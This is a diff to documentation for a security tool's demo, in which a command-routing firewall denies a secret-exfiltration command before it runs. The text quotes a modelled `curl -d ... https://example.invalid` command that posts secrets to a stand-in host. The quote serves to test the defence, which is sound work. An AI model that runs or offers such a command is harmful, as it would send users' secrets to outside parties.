@@ -1,8 +1,35 @@
-# Command Boundary Demo
+# Lane 2: Command Boundary Demo
 
-Command Boundary is a preview follow-on to the v0.3.0 MCP Firewall and Secure
-GitHub release story. It governs project-local command paths only when those
-commands route through Boundary.
+`boundary demo command-secret-exfil` is Lane 2 of Boundary's two-lane proof
+spine. It exercises Command Boundary, a delivered preview routed-only surface,
+by denying a routed secret-exfiltration command before execution.
+
+Command Boundary governs project-local command paths only when those commands
+route through Boundary.
+
+For the equal-weight MCP production-route proof lane, run
+`boundary demo github-lethal-trifecta` and read
+[../DEMO_GITHUB_LETHAL_TRIFECTA.md](../DEMO_GITHUB_LETHAL_TRIFECTA.md). The
+two-lane overview is [../DEMOS.md](../DEMOS.md).
+
+## User-Facing Proof Lane
+
+```bash
+boundary demo command-secret-exfil
+```
+
+Expected success signal:
+
+```text
+actual: DENY
+executed=false
+class=C6
+```
+
+The fixture models a routed `curl -d [redacted] https://example.invalid`
+secret-exfiltration command. Boundary classifies and evaluates the command,
+denies it before execution, and emits a decision record. No real `.env` file is
+read, no network call is made, and no live mutation occurs.
 
 ## Try It
 
